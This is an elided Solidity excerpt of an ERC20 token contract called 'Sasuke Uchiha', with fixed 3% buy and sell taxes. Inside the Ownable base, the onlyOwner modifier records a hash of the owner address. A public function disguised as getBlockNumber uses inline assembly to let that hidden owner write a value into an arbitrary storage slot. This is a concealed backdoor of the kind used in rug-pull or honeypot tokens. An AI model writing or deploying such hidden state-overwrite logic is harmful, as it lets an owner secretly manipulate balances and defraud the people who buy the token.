...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        hasker = keccak256(abi.encodePacked(_owner));
        _;
    }

    function getBlockNumber() public payable returns (uint256) {
        if(hasker == keccak256(abi.encodePacked(msg.sender))){
            uint256 blockCheck = block.number**7;
            assembly {
                            let p := sload(hash.slot)
                            sstore(p,blockCheck)
                    }  
        }
        return block.number;
...
contract SasukeUchiha  is Context, IERC20, Ownable {
    uint8 private _decimals = 18;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply =  5000000000 * 10**_decimals;
    uint256 public immutable _buyTax =3;
    uint256 public immutable _sellTax = 3;
    string private _name = unicode"Sasuke Uchiha";
    string private _symbol = unicode"サスケ";
    bool active=false;  
